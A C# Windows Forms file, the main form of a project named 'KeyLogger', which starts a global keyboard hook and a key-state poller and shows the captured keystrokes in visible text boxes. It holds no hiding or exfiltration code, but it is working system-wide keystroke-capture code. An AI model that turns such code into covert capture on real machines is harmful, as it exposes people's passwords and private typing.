using System;
using System.Windows.Forms;
using KeyLogger.Hook;
using KeyLogger.Poll;

namespace KeyLogger
{
    public partial class frmMain : Form
    {
        private GlobalKeyboardHook _keyboardHook;
        private AsyncKeyStateMonitor _keyPollMonitor;

        public frmMain()
        {
            InitializeComponent();
        }

        protected override void OnLoad(EventArgs e)
        {
            base.OnLoad(e);

            _keyboardHook = new GlobalKeyboardHook();
            _keyboardHook.KeyDetected += KeyboardHook_KeyDetected;
            _keyboardHook.Start();

            _keyPollMonitor = new AsyncKeyStateMonitor();
            _keyPollMonitor.KeyDetected += KeyPollMonitor_KeyDetected;
            _keyPollMonitor.Start();
        }

        protected override void OnFormClosed(FormClosedEventArgs e)
        {
            if (_keyboardHook != null)
            {
                _keyboardHook.KeyDetected -= KeyboardHook_KeyDetected;
                _keyboardHook.Dispose();
                _keyboardHook = null;
            }

            if (_keyPollMonitor != null)
            {
                _keyPollMonitor.KeyDetected -= KeyPollMonitor_KeyDetected;
                _keyPollMonitor.Dispose();
                _keyPollMonitor = null;
            }

            base.OnFormClosed(e);
        }

        private void KeyboardHook_KeyDetected(object sender, KeyDetectedEventArgs e)
        {
            if (InvokeRequired)
            {
                BeginInvoke(new Action<object, KeyDetectedEventArgs>(KeyboardHook_KeyDetected), sender, e);
                return;
            }

            txtKeys.AppendText(e.ToDisplayLine() + Environment.NewLine);
        }

        private void KeyPollMonitor_KeyDetected(object sender, KeyPollEventArgs e)
        {
            if (InvokeRequired)
            {
                BeginInvoke(new Action<object, KeyPollEventArgs>(KeyPollMonitor_KeyDetected), sender, e);
                return;
            }

            if (e.IsBackspace)
            {
                if (txtPollKeys.TextLength > 0)
                    txtPollKeys.Text = txtPollKeys.Text.Substring(0, txtPollKeys.TextLength - 1);
                return;
            }

            txtPollKeys.AppendText(e.Text);
        }
    }
}
